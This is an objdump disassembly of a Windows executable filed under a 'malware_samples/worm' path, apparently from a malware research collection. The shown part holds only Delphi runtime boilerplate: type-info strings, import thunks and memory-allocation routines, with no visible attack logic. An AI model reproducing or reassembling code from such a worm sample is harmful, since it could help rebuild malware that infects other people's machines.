
malware_samples/worm/fbd5ed2986f6dcdfe32fb0a659cb3363c5bb914ab523da589cad645418dc42f3.exe:     file format pei-i386


Disassembly of section CODE:

00401000 <CODE>:
  401000:	04 10                	add    $0x10,%al
  401002:	40                   	inc    %eax
  401003:	00 0a                	add    %cl,(%edx)
  401005:	06                   	push   %es
  401006:	53                   	push   %ebx
  401007:	74 72                	je     0x40107b
  401009:	69 6e 67 58 10 40 00 	imul   $0x401058,0x67(%esi),%ebp
	...
  40102c:	58                   	pop    %eax
  40102d:	10 40 00             	adc    %al,0x0(%eax)
  401030:	04 00                	add    $0x0,%al
  401032:	00 00                	add    %al,(%eax)
  401034:	00 00                	add    %al,(%eax)
  401036:	00 00                	add    %al,(%eax)
  401038:	9c                   	pushf
  401039:	31 40 00             	xor    %eax,0x0(%eax)
  40103c:	a8 31                	test   $0x31,%al
  40103e:	40                   	inc    %eax
  40103f:	00 ac 31 40 00 b0 31 	add    %ch,0x31b00040(%ecx,%esi,1)
  401046:	40                   	inc    %eax
  401047:	00 a4 31 40 00 28 2f 	add    %ah,0x2f280040(%ecx,%esi,1)
  40104e:	40                   	inc    %eax
  40104f:	00 44 2f 40          	add    %al,0x40(%edi,%ebp,1)
  401053:	00 80 2f 40 00 07    	add    %al,0x700402f(%eax)
  401059:	54                   	push   %esp
  40105a:	4f                   	dec    %edi
  40105b:	62 6a 65             	bound  %ebp,0x65(%edx)
  40105e:	63 74 64 10          	arpl   %esi,0x10(%esp,%eiz,2)
  401062:	40                   	inc    %eax
  401063:	00 07                	add    %al,(%edi)
  401065:	07                   	pop    %es
  401066:	54                   	push   %esp
  401067:	4f                   	dec    %edi
  401068:	62 6a 65             	bound  %ebp,0x65(%edx)
  40106b:	63 74 58 10          	arpl   %esi,0x10(%eax,%ebx,2)
  40106f:	40                   	inc    %eax
  401070:	00 00                	add    %al,(%eax)
  401072:	00 00                	add    %al,(%eax)
  401074:	00 00                	add    %al,(%eax)
  401076:	00 06                	add    %al,(%esi)
  401078:	53                   	push   %ebx
  401079:	79 73                	jns    0x4010ee
  40107b:	74 65                	je     0x4010e2
  40107d:	6d                   	insl   (%dx),%es:(%edi)
  40107e:	00 00                	add    %al,(%eax)
  401080:	84 10                	test   %dl,(%eax)
  401082:	40                   	inc    %eax
  401083:	00 0f                	add    %cl,(%edi)
  401085:	0a 49 49             	or     0x49(%ecx),%cl
  401088:	6e                   	outsb  %ds:(%esi),(%dx)
  401089:	74 65                	je     0x4010f0
  40108b:	72 66                	jb     0x4010f3
  40108d:	61                   	popa
  40108e:	63 65 00             	arpl   %esp,0x0(%ebp)
  401091:	00 00                	add    %al,(%eax)
  401093:	00 01                	add    %al,(%ecx)
	...
  40109d:	c0 00 00             	rolb   $0x0,(%eax)
  4010a0:	00 00                	add    %al,(%eax)
  4010a2:	00 00                	add    %al,(%eax)
  4010a4:	46                   	inc    %esi
  4010a5:	06                   	push   %es
  4010a6:	53                   	push   %ebx
  4010a7:	79 73                	jns    0x40111c
  4010a9:	74 65                	je     0x401110
  4010ab:	6d                   	insl   (%dx),%es:(%edi)
  4010ac:	03 00                	add    (%eax),%eax
  4010ae:	ff                   	(bad)
  4010af:	ff cc                	dec    %esp
  4010b1:	83 44 24 04 f8       	addl   $0xfffffff8,0x4(%esp)
  4010b6:	e9 e9 3e 00 00       	jmp    0x404fa4
  4010bb:	83 44 24 04 f8       	addl   $0xfffffff8,0x4(%esp)
  4010c0:	e9 07 3f 00 00       	jmp    0x404fcc
  4010c5:	83 44 24 04 f8       	addl   $0xfffffff8,0x4(%esp)
  4010ca:	e9 11 3f 00 00       	jmp    0x404fe0
  4010cf:	cc                   	int3
  4010d0:	cc                   	int3
  4010d1:	b1 10                	mov    $0x10,%cl
  4010d3:	40                   	inc    %eax
  4010d4:	00 bb 10 40 00 c5    	add    %bh,-0x3affbff0(%ebx)
  4010da:	10 40 00             	adc    %al,0x0(%eax)
  4010dd:	01 00                	add    %eax,(%eax)
	...
  4010e7:	00 00                	add    %al,(%eax)
  4010e9:	c0 00 00             	rolb   $0x0,(%eax)
  4010ec:	00 00                	add    %al,(%eax)
  4010ee:	00 00                	add    %al,(%eax)
  4010f0:	46                   	inc    %esi
  4010f1:	d1 10                	rcll   $1,(%eax)
  4010f3:	40                   	inc    %eax
  4010f4:	00 08                	add    %cl,(%eax)
  4010f6:	00 00                	add    %al,(%eax)
  4010f8:	00 00                	add    %al,(%eax)
  4010fa:	00 00                	add    %al,(%eax)
  4010fc:	00 8d 40 00 4c 11    	add    %cl,0x114c0040(%ebp)
  401102:	40                   	inc    %eax
  401103:	00 dd                	add    %bl,%ch
  401105:	10 40 00             	adc    %al,0x0(%eax)
	...
  401120:	4c                   	dec    %esp
  401121:	11 40 00             	adc    %eax,0x0(%eax)
  401124:	0c 00                	or     $0x0,%al
  401126:	00 00                	add    %al,(%eax)
  401128:	0c 10                	or     $0x10,%al
  40112a:	40                   	inc    %eax
  40112b:	00 9c 31 40 00 78 4f 	add    %bl,0x4f780040(%ecx,%esi,1)
  401132:	40                   	inc    %eax
  401133:	00 84 4f 40 00 b0 31 	add    %al,0x31b00040(%edi,%ecx,2)
  40113a:	40                   	inc    %eax
  40113b:	00 a4 31 40 00 94 4f 	add    %ah,0x4f940040(%ecx,%esi,1)
  401142:	40                   	inc    %eax
  401143:	00 44 2f 40          	add    %al,0x40(%edi,%ebp,1)
  401147:	00 80 2f 40 00 11    	add    %al,0x1100402f(%eax)
  40114d:	54                   	push   %esp
  40114e:	49                   	dec    %ecx
  40114f:	6e                   	outsb  %ds:(%esi),(%dx)
  401150:	74 65                	je     0x4011b7
  401152:	72 66                	jb     0x4011ba
  401154:	61                   	popa
  401155:	63 65 64             	arpl   %esp,0x64(%ebp)
  401158:	4f                   	dec    %edi
  401159:	62 6a 65             	bound  %ebp,0x65(%edx)
  40115c:	63 74 8b c0          	arpl   %esi,-0x40(%ebx,%ecx,4)
  401160:	ff 25 9c 41 43 00    	jmp    *0x43419c
  401166:	8b c0                	mov    %eax,%eax
  401168:	ff 25 98 41 43 00    	jmp    *0x434198
  40116e:	8b c0                	mov    %eax,%eax
  401170:	ff 25 94 41 43 00    	jmp    *0x434194
  401176:	8b c0                	mov    %eax,%eax
  401178:	ff 25 90 41 43 00    	jmp    *0x434190
  40117e:	8b c0                	mov    %eax,%eax
  401180:	ff 25 8c 41 43 00    	jmp    *0x43418c
  401186:	8b c0                	mov    %eax,%eax
  401188:	ff 25 b0 41 43 00    	jmp    *0x4341b0
  40118e:	8b c0                	mov    %eax,%eax
  401190:	ff 25 88 41 43 00    	jmp    *0x434188
  401196:	8b c0                	mov    %eax,%eax
  401198:	ff 25 ac 41 43 00    	jmp    *0x4341ac
  40119e:	8b c0                	mov    %eax,%eax
  4011a0:	ff 25 84 41 43 00    	jmp    *0x434184
  4011a6:	8b c0                	mov    %eax,%eax
  4011a8:	ff 25 80 41 43 00    	jmp    *0x434180
  4011ae:	8b c0                	mov    %eax,%eax
  4011b0:	ff 25 7c 41 43 00    	jmp    *0x43417c
  4011b6:	8b c0                	mov    %eax,%eax
  4011b8:	ff 25 78 41 43 00    	jmp    *0x434178
  4011be:	8b c0                	mov    %eax,%eax
  4011c0:	ff 25 74 41 43 00    	jmp    *0x434174
  4011c6:	8b c0                	mov    %eax,%eax
  4011c8:	ff 25 70 41 43 00    	jmp    *0x434170
  4011ce:	8b c0                	mov    %eax,%eax
  4011d0:	ff 25 6c 41 43 00    	jmp    *0x43416c
  4011d6:	8b c0                	mov    %eax,%eax
  4011d8:	ff 25 68 41 43 00    	jmp    *0x434168
  4011de:	8b c0                	mov    %eax,%eax
  4011e0:	ff 25 64 41 43 00    	jmp    *0x434164
  4011e6:	8b c0                	mov    %eax,%eax
  4011e8:	ff 25 60 41 43 00    	jmp    *0x434160
  4011ee:	8b c0                	mov    %eax,%eax
  4011f0:	ff 25 5c 41 43 00    	jmp    *0x43415c
  4011f6:	8b c0                	mov    %eax,%eax
  4011f8:	ff 25 a8 41 43 00    	jmp    *0x4341a8
  4011fe:	8b c0                	mov    %eax,%eax
  401200:	ff 25 58 41 43 00    	jmp    *0x434158
  401206:	8b c0                	mov    %eax,%eax
  401208:	ff 25 54 41 43 00    	jmp    *0x434154
  40120e:	8b c0                	mov    %eax,%eax
  401210:	ff 25 50 41 43 00    	jmp    *0x434150
  401216:	8b c0                	mov    %eax,%eax
  401218:	ff 25 c0 41 43 00    	jmp    *0x4341c0
  40121e:	8b c0                	mov    %eax,%eax
  401220:	ff 25 bc 41 43 00    	jmp    *0x4341bc
  401226:	8b c0                	mov    %eax,%eax
  401228:	ff 25 b8 41 43 00    	jmp    *0x4341b8
  40122e:	8b c0                	mov    %eax,%eax
  401230:	ff 25 4c 41 43 00    	jmp    *0x43414c
  401236:	8b c0                	mov    %eax,%eax
  401238:	ff 25 48 41 43 00    	jmp    *0x434148
  40123e:	8b c0                	mov    %eax,%eax
  401240:	ff 25 d0 41 43 00    	jmp    *0x4341d0
  401246:	8b c0                	mov    %eax,%eax
  401248:	ff 25 cc 41 43 00    	jmp    *0x4341cc
  40124e:	8b c0                	mov    %eax,%eax
  401250:	ff 25 c8 41 43 00    	jmp    *0x4341c8
  401256:	8b c0                	mov    %eax,%eax
  401258:	ff 25 44 41 43 00    	jmp    *0x434144
  40125e:	8b c0                	mov    %eax,%eax
  401260:	ff 25 40 41 43 00    	jmp    *0x434140
  401266:	8b c0                	mov    %eax,%eax
  401268:	ff 25 3c 41 43 00    	jmp    *0x43413c
  40126e:	8b c0                	mov    %eax,%eax
  401270:	ff 25 38 41 43 00    	jmp    *0x434138
  401276:	8b c0                	mov    %eax,%eax
  401278:	53                   	push   %ebx
  401279:	83 c4 bc             	add    $0xffffffbc,%esp
  40127c:	bb 0a 00 00 00       	mov    $0xa,%ebx
  401281:	54                   	push   %esp
  401282:	e8 59 ff ff ff       	call   0x4011e0
  401287:	f6 44 24 2c 01       	testb  $0x1,0x2c(%esp)
  40128c:	74 05                	je     0x401293
  40128e:	0f b7 5c 24 30       	movzwl 0x30(%esp),%ebx
  401293:	8b c3                	mov    %ebx,%eax
  401295:	83 c4 44             	add    $0x44,%esp
  401298:	5b                   	pop    %ebx
  401299:	c3                   	ret
  40129a:	8b c0                	mov    %eax,%eax
  40129c:	ff 25 34 41 43 00    	jmp    *0x434134
  4012a2:	8b c0                	mov    %eax,%eax
  4012a4:	ff 25 30 41 43 00    	jmp    *0x434130
  4012aa:	8b c0                	mov    %eax,%eax
  4012ac:	ff 25 2c 41 43 00    	jmp    *0x43412c
  4012b2:	8b c0                	mov    %eax,%eax
  4012b4:	ff 25 28 41 43 00    	jmp    *0x434128
  4012ba:	8b c0                	mov    %eax,%eax
  4012bc:	ff 25 24 41 43 00    	jmp    *0x434124
  4012c2:	8b c0                	mov    %eax,%eax
  4012c4:	ff 25 20 41 43 00    	jmp    *0x434120
  4012ca:	8b c0                	mov    %eax,%eax
  4012cc:	ff 25 1c 41 43 00    	jmp    *0x43411c
  4012d2:	8b c0                	mov    %eax,%eax
  4012d4:	ff 25 18 41 43 00    	jmp    *0x434118
  4012da:	8b c0                	mov    %eax,%eax
  4012dc:	53                   	push   %ebx
  4012dd:	56                   	push   %esi
  4012de:	be e0 45 42 00       	mov    $0x4245e0,%esi
  4012e3:	83 3e 00             	cmpl   $0x0,(%esi)
  4012e6:	75 3a                	jne    0x401322
  4012e8:	68 44 06 00 00       	push   $0x644
  4012ed:	6a 00                	push   $0x0
  4012ef:	e8 a8 ff ff ff       	call   0x40129c
  4012f4:	8b c8                	mov    %eax,%ecx
  4012f6:	85 c9                	test   %ecx,%ecx
  4012f8:	75 05                	jne    0x4012ff
  4012fa:	33 c0                	xor    %eax,%eax
  4012fc:	5e                   	pop    %esi
  4012fd:	5b                   	pop    %ebx
  4012fe:	c3                   	ret
  4012ff:	a1 dc 45 42 00       	mov    0x4245dc,%eax
  401304:	89 01                	mov    %eax,(%ecx)
  401306:	89 0d dc 45 42 00    	mov    %ecx,0x4245dc
  40130c:	33 d2                	xor    %edx,%edx
  40130e:	8b c2                	mov    %edx,%eax
  401310:	03 c0                	add    %eax,%eax
  401312:	8d 44 c1 04          	lea    0x4(%ecx,%eax,8),%eax
  401316:	8b 1e                	mov    (%esi),%ebx
  401318:	89 18                	mov    %ebx,(%eax)
  40131a:	89 06                	mov    %eax,(%esi)
  40131c:	42                   	inc    %edx
  40131d:	83 fa 64             	cmp    $0x64,%edx
  401320:	75 ec                	jne    0x40130e
  401322:	8b 06                	mov    (%esi),%eax
  401324:	8b 10                	mov    (%eax),%edx
  401326:	89 16                	mov    %edx,(%esi)
  401328:	5e                   	pop    %esi
  401329:	5b                   	pop    %ebx
  40132a:	c3                   	ret
  40132b:	90                   	nop
  40132c:	89 00                	mov    %eax,(%eax)
  40132e:	89 40 04             	mov    %eax,0x4(%eax)
  401331:	c3                   	ret
  401332:	8b c0                	mov    %eax,%eax
  401334:	53                   	push   %ebx
  401335:	56                   	push   %esi
  401336:	8b f2                	mov    %edx,%esi
  401338:	8b d8                	mov    %eax,%ebx
  40133a:	e8 9d ff ff ff       	call   0x4012dc
  40133f:	85 c0                	test   %eax,%eax
  401341:	75 05                	jne    0x401348
  401343:	33 c0                	xor    %eax,%eax
  401345:	5e                   	pop    %esi
  401346:	5b                   	pop    %ebx
  401347:	c3                   	ret
  401348:	8b 16                	mov    (%esi),%edx
  40134a:	89 50 08             	mov    %edx,0x8(%eax)
  40134d:	8b 56 04             	mov    0x4(%esi),%edx
  401350:	89 50 0c             	mov    %edx,0xc(%eax)
  401353:	8b 13                	mov    (%ebx),%edx
  401355:	89 10                	mov    %edx,(%eax)
  401357:	89 58 04             	mov    %ebx,0x4(%eax)
  40135a:	89 42 04             	mov    %eax,0x4(%edx)
  40135d:	89 03                	mov    %eax,(%ebx)
  40135f:	b0 01                	mov    $0x1,%al
  401361:	5e                   	pop    %esi
  401362:	5b                   	pop    %ebx
  401363:	c3                   	ret
  401364:	8b 50 04             	mov    0x4(%eax),%edx
  401367:	8b 08                	mov    (%eax),%ecx
  401369:	89 0a                	mov    %ecx,(%edx)
  40136b:	89 51 04             	mov    %edx,0x4(%ecx)
  40136e:	8b 15 e0 45 42 00    	mov    0x4245e0,%edx
  401374:	89 10                	mov    %edx,(%eax)
  401376:	a3 e0 45 42 00       	mov    %eax,0x4245e0
  40137b:	c3                   	ret
  40137c:	53                   	push   %ebx
  40137d:	56                   	push   %esi
  40137e:	57                   	push   %edi
  40137f:	55                   	push   %ebp
  401380:	51                   	push   %ecx
  401381:	8b f1                	mov    %ecx,%esi
  401383:	89 14 24             	mov    %edx,(%esp)
  401386:	8b e8                	mov    %eax,%ebp
  401388:	8b 5d 00             	mov    0x0(%ebp),%ebx
  40138b:	8b 04 24             	mov    (%esp),%eax
  40138e:	8b 10                	mov    (%eax),%edx
  401390:	89 16                	mov    %edx,(%esi)
  401392:	8b 50 04             	mov    0x4(%eax),%edx
  401395:	89 56 04             	mov    %edx,0x4(%esi)
  401398:	8b 3b                	mov    (%ebx),%edi
  40139a:	8b 06                	mov    (%esi),%eax
  40139c:	8b 53 08             	mov    0x8(%ebx),%edx
  40139f:	03 53 0c             	add    0xc(%ebx),%edx
  4013a2:	3b c2                	cmp    %edx,%eax
  4013a4:	75 14                	jne    0x4013ba
  4013a6:	8b c3                	mov    %ebx,%eax
  4013a8:	e8 b7 ff ff ff       	call   0x401364
  4013ad:	8b 43 08             	mov    0x8(%ebx),%eax
  4013b0:	89 06                	mov    %eax,(%esi)
  4013b2:	8b 43 0c             	mov    0xc(%ebx),%eax
  4013b5:	01 46 04             	add    %eax,0x4(%esi)
  4013b8:	eb 15                	jmp    0x4013cf
  4013ba:	03 46 04             	add    0x4(%esi),%eax
  4013bd:	3b 43 08             	cmp    0x8(%ebx),%eax
  4013c0:	75 0d                	jne    0x4013cf
  4013c2:	8b c3                	mov    %ebx,%eax
  4013c4:	e8 9b ff ff ff       	call   0x401364
  4013c9:	8b 43 0c             	mov    0xc(%ebx),%eax
  4013cc:	01 46 04             	add    %eax,0x4(%esi)
  4013cf:	8b df                	mov    %edi,%ebx
  4013d1:	3b eb                	cmp    %ebx,%ebp
  4013d3:	75 c3                	jne    0x401398
  4013d5:	8b d6                	mov    %esi,%edx
  4013d7:	8b c5                	mov    %ebp,%eax
  4013d9:	e8 56 ff ff ff       	call   0x401334
  4013de:	84 c0                	test   %al,%al
  4013e0:	75 04                	jne    0x4013e6
  4013e2:	33 c0                	xor    %eax,%eax
  4013e4:	89 06                	mov    %eax,(%esi)
  4013e6:	5a                   	pop    %edx
  4013e7:	5d                   	pop    %ebp
  4013e8:	5f                   	pop    %edi
  4013e9:	5e                   	pop    %esi
  4013ea:	5b                   	pop    %ebx
  4013eb:	c3                   	ret
  4013ec:	53                   	push   %ebx
  4013ed:	56                   	push   %esi
  4013ee:	57                   	push   %edi
  4013ef:	55                   	push   %ebp
  4013f0:	83 c4 f8             	add    $0xfffffff8,%esp
  4013f3:	8b d8                	mov    %eax,%ebx
  4013f5:	8b fb                	mov    %ebx,%edi
  4013f7:	8b 32                	mov    (%edx),%esi
  4013f9:	8b 43 08             	mov    0x8(%ebx),%eax
  4013fc:	3b f0                	cmp    %eax,%esi
  4013fe:	72 70                	jb     0x401470
  401400:	8b ce                	mov    %esi,%ecx
  401402:	03 4a 04             	add    0x4(%edx),%ecx
  401405:	8b e8                	mov    %eax,%ebp
  401407:	03 6b 0c             	add    0xc(%ebx),%ebp
  40140a:	3b cd                	cmp    %ebp,%ecx
  40140c:	77 62                	ja     0x401470
  40140e:	3b f0                	cmp    %eax,%esi
  401410:	75 1b                	jne    0x40142d
  401412:	8b 42 04             	mov    0x4(%edx),%eax
  401415:	01 43 08             	add    %eax,0x8(%ebx)
  401418:	8b 42 04             	mov    0x4(%edx),%eax
  40141b:	29 43 0c             	sub    %eax,0xc(%ebx)
  40141e:	83 7b 0c 00          	cmpl   $0x0,0xc(%ebx)
  401422:	75 48                	jne    0x40146c
  401424:	8b c3                	mov    %ebx,%eax
  401426:	e8 39 ff ff ff       	call   0x401364
  40142b:	eb 3f                	jmp    0x40146c
  40142d:	8b ce                	mov    %esi,%ecx
  40142f:	8b 7a 04             	mov    0x4(%edx),%edi
  401432:	03 cf                	add    %edi,%ecx
  401434:	8b e8                	mov    %eax,%ebp
  401436:	03 6b 0c             	add    0xc(%ebx),%ebp
  401439:	3b cd                	cmp    %ebp,%ecx
  40143b:	75 05                	jne    0x401442
  40143d:	29 7b 0c             	sub    %edi,0xc(%ebx)
  401440:	eb 2a                	jmp    0x40146c
  401442:	8b 0a                	mov    (%edx),%ecx
  401444:	03 4a 04             	add    0x4(%edx),%ecx
  401447:	89 0c 24             	mov    %ecx,(%esp)
  40144a:	8b 7b 08             	mov    0x8(%ebx),%edi
  40144d:	03 7b 0c             	add    0xc(%ebx),%edi
  401450:	2b f9                	sub    %ecx,%edi
  401452:	89 7c 24 04          	mov    %edi,0x4(%esp)
  401456:	2b f0                	sub    %eax,%esi
  401458:	89 73 0c             	mov    %esi,0xc(%ebx)
  40145b:	8b d4                	mov    %esp,%edx
  40145d:	8b c3                	mov    %ebx,%eax
  40145f:	e8 d0 fe ff ff       	call   0x401334
  401464:	84 c0                	test   %al,%al
  401466:	75 04                	jne    0x40146c
  401468:	33 c0                	xor    %eax,%eax
  40146a:	eb 0c                	jmp    0x401478
  40146c:	b0 01                	mov    $0x1,%al
  40146e:	eb 08                	jmp    0x401478
  401470:	8b 1b                	mov    (%ebx),%ebx
  401472:	3b fb                	cmp    %ebx,%edi
  401474:	75 81                	jne    0x4013f7
  401476:	33 c0                	xor    %eax,%eax
  401478:	59                   	pop    %ecx
  401479:	5a                   	pop    %edx
  40147a:	5d                   	pop    %ebp
  40147b:	5f                   	pop    %edi
  40147c:	5e                   	pop    %esi
  40147d:	5b                   	pop    %ebx
  40147e:	c3                   	ret
  40147f:	90                   	nop
  401480:	53                   	push   %ebx
  401481:	56                   	push   %esi
  401482:	57                   	push   %edi
  401483:	8b da                	mov    %edx,%ebx
  401485:	8b f0                	mov    %eax,%esi
  401487:	81 fe 00 00 10 00    	cmp    $0x100000,%esi
  40148d:	7d 07                	jge    0x401496
  40148f:	be 00 00 10 00       	mov    $0x100000,%esi
  401494:	eb 0c                	jmp    0x4014a2
  401496:	81 c6 ff ff 00 00    	add    $0xffff,%esi
  40149c:	81 e6 00 00 ff ff    	and    $0xffff0000,%esi
  4014a2:	89 73 04             	mov    %esi,0x4(%ebx)
  4014a5:	6a 01                	push   $0x1
  4014a7:	68 00 20 00 00       	push   $0x2000
  4014ac:	56                   	push   %esi
  4014ad:	6a 00                	push   $0x0
  4014af:	e8 f8 fd ff ff       	call   0x4012ac
  4014b4:	8b f8                	mov    %eax,%edi
  4014b6:	89 3b                	mov    %edi,(%ebx)
  4014b8:	85 ff                	test   %edi,%edi
  4014ba:	74 23                	je     0x4014df
  4014bc:	8b d3                	mov    %ebx,%edx
  4014be:	b8 e4 45 42 00       	mov    $0x4245e4,%eax
  4014c3:	e8 6c fe ff ff       	call   0x401334
  4014c8:	84 c0                	test   %al,%al
  4014ca:	75 13                	jne    0x4014df
  4014cc:	68 00 80 00 00       	push   $0x8000
  4014d1:	6a 00                	push   $0x0
  4014d3:	8b 03                	mov    (%ebx),%eax
  4014d5:	50                   	push   %eax
  4014d6:	e8 d9 fd ff ff       	call   0x4012b4
  4014db:	33 c0                	xor    %eax,%eax
  4014dd:	89 03                	mov    %eax,(%ebx)
  4014df:	5f                   	pop    %edi
  4014e0:	5e                   	pop    %esi
  4014e1:	5b                   	pop    %ebx
  4014e2:	c3                   	ret
  4014e3:	90                   	nop
  4014e4:	53                   	push   %ebx
  4014e5:	56                   	push   %esi
  4014e6:	57                   	push   %edi
  4014e7:	55                   	push   %ebp
  4014e8:	8b d9                	mov    %ecx,%ebx
  4014ea:	8b f2                	mov    %edx,%esi
  4014ec:	8b e8                	mov    %eax,%ebp
  4014ee:	c7 43 04 00 00 10 00 	movl   $0x100000,0x4(%ebx)
  4014f5:	6a 04                	push   $0x4
  4014f7:	68 00 20 00 00       	push   $0x2000
  4014fc:	68 00 00 10 00       	push   $0x100000
  401501:	55                   	push   %ebp
  401502:	e8 a5 fd ff ff       	call   0x4012ac
  401507:	8b f8                	mov    %eax,%edi
  401509:	89 3b                	mov    %edi,(%ebx)
  40150b:	85 ff                	test   %edi,%edi
  40150d:	75 1f                	jne    0x40152e
  40150f:	81 c6 ff ff 00 00    	add    $0xffff,%esi
  401515:	81 e6 00 00 ff ff    	and    $0xffff0000,%esi
  40151b:	89 73 04             	mov    %esi,0x4(%ebx)
  40151e:	6a 04                	push   $0x4
  401520:	68 00 20 00 00       	push   $0x2000
  401525:	56                   	push   %esi
  401526:	55                   	push   %ebp
  401527:	e8 80 fd ff ff       	call   0x4012ac
  40152c:	89 03                	mov    %eax,(%ebx)
  40152e:	83 3b 00             	cmpl   $0x0,(%ebx)
  401531:	74 23                	je     0x401556
  401533:	8b d3                	mov    %ebx,%edx
  401535:	b8 e4 45 42 00       	mov    $0x4245e4,%eax
  40153a:	e8 f5 fd ff ff       	call   0x401334
  40153f:	84 c0                	test   %al,%al
  401541:	75 13                	jne    0x401556
  401543:	68 00 80 00 00       	push   $0x8000
  401548:	6a 00                	push   $0x0
  40154a:	8b 03                	mov    (%ebx),%eax
  40154c:	50                   	push   %eax
  40154d:	e8 62 fd ff ff       	call   0x4012b4
  401552:	33 c0                	xor    %eax,%eax
  401554:	89 03                	mov    %eax,(%ebx)
  401556:	5d                   	pop    %ebp
  401557:	5f                   	pop    %edi
  401558:	5e                   	pop    %esi
  401559:	5b                   	pop    %ebx
  40155a:	c3                   	ret
  40155b:	90                   	nop
  40155c:	53                   	push   %ebx
  40155d:	56                   	push   %esi
  40155e:	57                   	push   %edi
  40155f:	55                   	push   %ebp
  401560:	83 c4 ec             	add    $0xffffffec,%esp
  401563:	89 4c 24 04          	mov    %ecx,0x4(%esp)
  401567:	89 14 24             	mov    %edx,(%esp)
  40156a:	c7 44 24 08 ff ff ff 	movl   $0xffffffff,0x8(%esp)
  401571:	ff 
  401572:	33 d2                	xor    %edx,%edx
  401574:	89 54 24 0c          	mov    %edx,0xc(%esp)
  401578:	8b e8                	mov    %eax,%ebp
  40157a:	8b 04 24             	mov    (%esp),%eax
  40157d:	03 c5                	add    %ebp,%eax
  40157f:	89 44 24 10          	mov    %eax,0x10(%esp)
  401583:	8b 1d e4 45 42 00    	mov    0x4245e4,%ebx
  401589:	eb 51                	jmp    0x4015dc
  40158b:	8b 3b                	mov    (%ebx),%edi
  40158d:	8b 73 08             	mov    0x8(%ebx),%esi
  401590:	3b ee                	cmp    %esi,%ebp
  401592:	77 46                	ja     0x4015da
  401594:	8b c6                	mov    %esi,%eax
  401596:	03 43 0c             	add    0xc(%ebx),%eax
  401599:	3b 44 24 10          	cmp    0x10(%esp),%eax
  40159d:	77 3b                	ja     0x4015da
  40159f:	3b 74 24 08          	cmp    0x8(%esp),%esi
  4015a3:	73 04                	jae    0x4015a9
  4015a5:	89 74 24 08          	mov    %esi,0x8(%esp)
  4015a9:	8b c6                	mov    %esi,%eax
  4015ab:	03 43 0c             	add    0xc(%ebx),%eax
  4015ae:	3b 44 24 0c          	cmp    0xc(%esp),%eax
  4015b2:	76 04                	jbe    0x4015b8
  4015b4:	89 44 24 0c          	mov    %eax,0xc(%esp)
  4015b8:	68 00 80 00 00       	push   $0x8000
  4015bd:	6a 00                	push   $0x0
  4015bf:	56                   	push   %esi
  4015c0:	e8 ef fc ff ff       	call   0x4012b4
  4015c5:	85 c0                	test   %eax,%eax
  4015c7:	75 0a                	jne    0x4015d3
  4015c9:	c7 05 c0 45 42 00 01 	movl   $0x1,0x4245c0
  4015d0:	00 00 00 
  4015d3:	8b c3                	mov    %ebx,%eax
  4015d5:	e8 8a fd ff ff       	call   0x401364
  4015da:	8b df                	mov    %edi,%ebx
  4015dc:	81 fb e4 45 42 00    	cmp    $0x4245e4,%ebx
  4015e2:	75 a7                	jne    0x40158b
  4015e4:	8b 44 24 04          	mov    0x4(%esp),%eax
  4015e8:	33 d2                	xor    %edx,%edx
  4015ea:	89 10                	mov    %edx,(%eax)
  4015ec:	83 7c 24 0c 00       	cmpl   $0x0,0xc(%esp)
  4015f1:	74 19                	je     0x40160c
  4015f3:	8b 44 24 04          	mov    0x4(%esp),%eax
  4015f7:	8b 54 24 08          	mov    0x8(%esp),%edx
  4015fb:	89 10                	mov    %edx,(%eax)
  4015fd:	8b 44 24 0c          	mov    0xc(%esp),%eax
  401601:	2b 44 24 08          	sub    0x8(%esp),%eax
  401605:	8b 54 24 04          	mov    0x4(%esp),%edx
  401609:	89 42 04             	mov    %eax,0x4(%edx)
  40160c:	83 c4 14             	add    $0x14,%esp
  40160f:	5d                   	pop    %ebp
  401610:	5f                   	pop    %edi
  401611:	5e                   	pop    %esi
  401612:	5b                   	pop    %ebx
  401613:	c3                   	ret
  401614:	53                   	push   %ebx
  401615:	56                   	push   %esi
  401616:	57                   	push   %edi
  401617:	55                   	push   %ebp
  401618:	83 c4 f4             	add    $0xfffffff4,%esp
  40161b:	89 4c 24 04          	mov    %ecx,0x4(%esp)
  40161f:	89 14 24             	mov    %edx,(%esp)
  401622:	8b d0                	mov    %eax,%edx
  401624:	8b ea                	mov    %edx,%ebp
  401626:	81 e5 00 f0 ff ff    	and    $0xfffff000,%ebp
  40162c:	03 14 24             	add    (%esp),%edx
  40162f:	81 c2 ff 0f 00 00    	add    $0xfff,%edx
  401635:	81 e2 00 f0 ff ff    	and    $0xfffff000,%edx
  40163b:	89 54 24 08          	mov    %edx,0x8(%esp)
  40163f:	8b 44 24 04          	mov    0x4(%esp),%eax
  401643:	89 28                	mov    %ebp,(%eax)
  401645:	8b 44 24 08          	mov    0x8(%esp),%eax
  401649:	2b c5                	sub    %ebp,%eax
  40164b:	8b 54 24 04          	mov    0x4(%esp),%edx
  40164f:	89 42 04             	mov    %eax,0x4(%edx)
  401652:	8b 35 e4 45 42 00    	mov    0x4245e4,%esi
  401658:	eb 3c                	jmp    0x401696
  40165a:	8b 5e 08             	mov    0x8(%esi),%ebx
  40165d:	8b 7e 0c             	mov    0xc(%esi),%edi
  401660:	03 fb                	add    %ebx,%edi
  401662:	3b eb                	cmp    %ebx,%ebp
  401664:	76 02                	jbe    0x401668
  401666:	8b dd                	mov    %ebp,%ebx
  401668:	3b 7c 24 08          	cmp    0x8(%esp),%edi
  40166c:	76 04                	jbe    0x401672
  40166e:	8b 7c 24 08          	mov    0x8(%esp),%edi
  401672:	3b fb                	cmp    %ebx,%edi
  401674:	76 1e                	jbe    0x401694
  401676:	6a 04                	push   $0x4
  401678:	68 00 10 00 00       	push   $0x1000
  40167d:	2b fb                	sub    %ebx,%edi
  40167f:	57                   	push   %edi
  401680:	53                   	push   %ebx
  401681:	e8 26 fc ff ff       	call   0x4012ac
  401686:	85 c0                	test   %eax,%eax
  401688:	75 0a                	jne    0x401694
  40168a:	8b 44 24 04          	mov    0x4(%esp),%eax
  40168e:	33 d2                	xor    %edx,%edx
  401690:	89 10                	mov    %edx,(%eax)
  401692:	eb 0a                	jmp    0x40169e
  401694:	8b 36                	mov    (%esi),%esi
  401696:	81 fe e4 45 42 00    	cmp    $0x4245e4,%esi
  40169c:	75 bc                	jne    0x40165a
  40169e:	83 c4 0c             	add    $0xc,%esp
  4016a1:	5d                   	pop    %ebp
  4016a2:	5f                   	pop    %edi
  4016a3:	5e                   	pop    %esi
  4016a4:	5b                   	pop    %ebx
  4016a5:	c3                   	ret
  4016a6:	8b c0                	mov    %eax,%eax
  4016a8:	53                   	push   %ebx
  4016a9:	56                   	push   %esi
